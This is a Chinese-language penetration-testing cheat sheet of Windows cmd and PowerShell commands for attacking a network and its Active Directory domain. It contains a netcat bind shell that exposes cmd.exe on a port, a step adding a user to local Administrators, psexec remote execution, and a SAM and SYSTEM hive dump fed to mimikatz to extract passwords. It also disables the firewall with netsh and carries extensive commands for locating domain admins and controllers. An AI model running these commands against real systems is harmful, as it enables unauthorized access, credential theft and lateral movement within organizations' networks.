# cmd 常用的命令

- nc

```cmd
.\nc.exe -lp 7777 -e cmd.exe
nc.exe 172.16.100.41 7777
```

- 查看操作系統

```cmd
echo %PROCESSOR_ARCHITECTURE%   # 查看系统体系结构
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"    # 英文系统
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"       # 中文系统

whoami  # 查看当前权限
whoami /all     # 获取SID

whoami /user    # 获取域SID
net time /domain    # 判断主域
net user student41 /domain      # 获取域管理员信息
net group "domain admins" /domain   # 查看域管理员
net accounts /domain    # 查看密码长度，可以输入错误的次数
```

- 组管理

```cmd
net localgroup
net localgroup "Administrators"
net localgroup "Administrators" dcorp\student41 /add
net localgroup "Administrators" dcorp\student41 /del
```

- ipc$命令

```cmd
net use \\ip\ipc$ "pass" /user:"name"   # 连接
net use \\ip\ipc$ "pass" /user:"AD\name"   # AD连接
net use * /del /y       # 断开连接
net view \\ip       # 查看远程主机的共享资源
net use z: \\192.168.22.164\c$  # 将c盘映射到本地


linux连接方式：
smbclient -L 192.168.22.164 -U administrator    # 连接
smbclient -L 192.168.22.164 -U AD\administrator    # AD连接
smbclient \\\\192.168.22.164\\C$ -U administrator   # 将c盘映射过来
```

- runas 命令以指定的权限启动一个进程

```cmd
# 标准用户权限运行命令
runas /trustlevel:0x20000 cmd.exe

# 是管理员权限运行命令
runas /trustlevel:0x40000 cmd.exe

# 以管理员权限执行命令
runas /trustlevel:0x40000 ".\nc.exe -lp 7777 -e powershell.exe"

runas /netonly /user:administrator cmd
runas /netonly /user:AD\NAME cmd    # AD连接
```

- 在域中执行命令

```powershell
E:\>net use \\WIN-0DKN2AS0T2G\c$
E:\>psexec.exe \\WIN-0DKN2AS0T2G cmd
```

- 获取密码

```powershell
# 导出数据注册表信息
reg save HKLM\SYSTEM D:\neinei\Sys.hiv
reg save HKLM\SAM D:\neinei\Sam.hiv

# mimikatz运行解密命令
lsadump::sam /sam:Sam.hiv /system:Sys.hiv
```

## 手动信息收集

```powershell
ipconfig /all   # 查询网络配置信息

wmic prouct get name version   # 查看安装的软件的版本、路径等
powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name, version" # PowerShell收集软件的版本信息

# 查询本机的服务信息
wmic service list brief # 查询本机服务信息

# 查询进程列表
tasklist    # 查看当前进程列表和进程用户
wmic process list brief     # 查询进程信息

wmic startup get command, caption   # 查看启动程序信息
schtasks /query /fo LIST /v     # 查看计划任务
net statistics workstation  # 查看主机开机时间

# 查询用户列表
net user    # 查看本机用户列表
net localgroup administrators   # 获取本地管理员信息
query user || qwinsta   # 查看在线用户

net session     # 列出或断开本地计算机与所连接的客户端的对话
netstat -ano    # 查询端口列表

# 查看补丁列表
systeminfo  # 查看系统详情
wmic qfe get Caption,Description,HotFixID,InstalledOn   # 查看补丁的名称、描述、ID、安装时间等

net share   # 查看本机共享列表和可访问的域共享列表
wmic share get name,path,status     # 查找共享列表

route print # 查询路由表
arp -a  # 所有可用接口的ARP缓存表

# 查询防火墙相关配置
netsh firewall set opmode disable   # 关闭防火墙(Windows Server 2003 以前的版本)
netsh advfirewall set allprofiles state off     # 关闭防火墙(Windows Server 2003 以后的版本)
netsh firewall show config  # 查看防火墙配置

```

## 自动信息收集

为了简化手动信息收集的繁琐步骤，我们可用使用自动化脚本 —— WMIC(Windows Management InstrumentationCommand Line,Windows管理工具命令行)脚本，[脚本下载地址](http://www.fuzzysecurity.com/scripts/files/wmic_info.rar)`http://www.fuzzysecurity.com/scripts/files/wmic_info.rar`，执行该脚本以后，会将信息收集的结果写入HTML文档。

## 域信息收集

```powershell
# 查看当前全权限
whoami  # 查看当前权限
whoami /all     # 获取SID
net user xxx /domain    # 查询指定用户的详情信息

# 判断是否存在域
ipcondig /all   # 可查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处在同一网段等... 然后，通过反向解析查询命令nslookup 来解析域名的IP地址，用解析到的IP地址进行对比，判断域控服务器和DNS服务器是否在同一台机器上。
systeminfo      # 对比查看"域(域名)"和"登录服务器(域控制器)"的信息是否互相匹配。
net config workstation  # 对比查看"工作站域DNS名称(域名)"和"登录域()域控制器"的信息是否相匹配。
net time /domain    # 判断主域。

net view /domain  # 查询域
net view /domain:HACHE # 查询域内的所有计算机
net group /domain   # 查询域内的所有计算机
net group "domain computers" /domain # 查询所有域成员计算机列表
net accounts /domain  # 获取域密码信息
nltest /domain_trusts # 获取域信任信息
```

- 探测域内存活主机

```cmd
使用nbtscan扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器, 输出的结果第一列为IP地址，第二列为机器名和所在域的名称，第三列即最后一列为及其所开启的服务的列表，使用方法：nbt.exe 192.168.1.1/20。
使用ICMP协议快速探测内网
arp-scan工具 使用方法：arp.exe -t 192.168.1.1/20
Empire的arpscan模块
Nishang中的Invoke-ARPScan.ps1脚本
ScanLine脚本
```

- 扫描域内端口信息

```cmd
telnet命令进行扫描
S扫描器
Metatsploit框架，"msfconsole"下的"serach portscan"命令
PowerSploit的Invoke-ARPScan.ps1脚本
Nishang中的Invoke-PortScan模块
端口banner信息的利用
```

- 查找域控制器

```cmd
nltest /DCLIST:hacke    # 查看域控制器的机器名
Nslookup -type=SRV_ldap._tcp    # 查看域控制器的主机名
net time /domain    # 查看当前时间
net group "Domain Controllers" /domain  # 查看域控制器组
netdom query pdc    # 查看域控制器的机器名
```

- 获取域内的用户和管理员信息

```cmd
# 查询域内用户列表
net user /domain    # 查看域用户
wmic useraccount get /all   # 获取域内用户的详细信息
dsquery user    # 查看存在的用户
net localgroup administrators   # 查询本地管理员用户

net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多
net view /domain 查看有几个域
net group /domain 查看域里面的组
net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管
net group "domain controllers" /domain 域控
net time /domain
net config workstation 当前登录域 - 计算机名 - 用户名
net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源

# 查询域管理员用户组
net group "domain admins" /domain   # 查询域管理员用户
net group "Enterprise admins" /domain   #查询管理员用户组
```

- 定位域管理员

在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员权限；定位域内管理员的常规渠道，一是日志，二是会话。
常见域管理员定位工具：

```cmd
psloggedon.exe
PVEFindADUser.exe
netview.exe
Nmap的NSE脚本
PowerView脚本
Empire的user_hunter模块
```

- 查找域管理进程

```cmd
net group "Domain Admins" /domain   # 获取域管理员列表
tasklist /v     # 列出本机的所有进程及进程用户
net group "Domain Controllers" /domain  # 查询域控制器列表
NetSess -h  # 收集所有活动域的会话列表
```
